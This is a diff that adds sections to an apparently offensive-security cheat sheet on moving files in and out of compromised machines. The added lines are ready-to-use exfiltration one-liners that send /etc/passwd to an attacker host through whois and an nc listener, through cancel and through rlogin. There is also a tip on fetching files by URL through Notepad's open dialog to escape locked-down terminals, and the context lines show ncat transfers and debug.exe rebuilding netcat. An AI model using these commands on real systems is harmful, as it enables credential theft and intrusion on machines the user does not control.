@@ -35,6 +35,41 @@ ncat -nvlp port --ssl > out-file
 ncat -nv target-ip port --ssl < file-to-send
 ```
 
+## <mark style="color:red;">WHOIS Data Exfiltration</mark>
+
+```
+# attacker
+nc -l -v -p 43 | sed "s/ //g" | base64 -d
+# victim
+whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
+```
+
+## <mark style="color:red;">Cancel Data Exfiltration</mark>
+
+```
+cancel -u "$(cat /etc/passwd)" -h ip:port
+```
+
+## <mark style="color:red;">Rlogin Data Exfiltration</mark>
+
+```
+rlogin -l "$(cat /etc/passwd)" -p port host
+```
+
+## <mark style="color:red;">Notepad Dialog Box File Download</mark>
+
+If you have access (RDP, physical, etc.) to a machine, but your user permissions do not allow you to open a web browser, this is a trick you can use to quickly download a file from a URL or a Universal Naming Convention (UNC) path. This also works well when you are breaking out of a locked-down application being run on a terminal.
+
+* Open notepad
+* Go to file – open
+* in the File Name box near the bottom, type in the full URL path to your file
+
+![](<../../.gitbook/assets/image (50).png>)
+
+Notepad is kind enough to go out and grab the contents of this file for you.
+
+
+
 ## <mark style="color:red;">debug.exe</mark>
 
 This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe.
